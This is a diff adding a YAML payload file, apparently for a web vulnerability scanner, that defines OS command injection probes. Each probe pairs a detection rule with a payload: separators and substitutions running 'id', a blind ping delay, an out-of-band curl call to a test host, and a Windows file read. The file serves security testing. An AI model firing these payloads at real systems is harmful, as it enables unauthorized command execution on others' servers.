@@ -1,0 +1,54 @@
+id: cmdi-os
+name: OS command injection
+context:
+  any: true
+
+payloads:
+  - value: ";id"
+    detect: { body_regex: "uid=\\d+" }
+    id: cmdi-semi-01
+    title: "Command injection — semicolon separator"
+    severity: critical
+    cwe: CWE-78
+
+  - value: "|id"
+    detect: { body_regex: "uid=\\d+" }
+    id: cmdi-pipe-01
+    title: "Command injection — pipe operator"
+    severity: critical
+    cwe: CWE-78
+
+  - value: "$(id)"
+    detect: { body_regex: "uid=\\d+" }
+    id: cmdi-sub-01
+    title: "Command injection — command substitution"
+    severity: critical
+    cwe: CWE-78
+
+  - value: "`id`"
+    detect: { body_regex: "uid=\\d+" }
+    id: cmdi-tick-01
+    title: "Command injection — backtick execution"
+    severity: critical
+    cwe: CWE-78
+
+  - value: "& ping -c 3 127.0.0.1 &"
+    detect: { time_based_ms: 2500 }
+    id: cmdi-blind-01
+    title: "Command injection — blind (ping delay)"
+    severity: critical
+    cwe: CWE-78
+
+  - value: "| curl http://cyweb.test/cmdi-confirm"
+    detect: { status_change: true }
+    id: cmdi-oob-01
+    title: "Command injection — out-of-band (curl)"
+    severity: critical
+    cwe: CWE-78
+
+  - value: ";type C:\\Windows\\win.ini"
+    detect: { body_contains: "[fonts]" }
+    id: cmdi-win-01
+    title: "Command injection — Windows (type win.ini)"
+    severity: critical
+    cwe: CWE-78
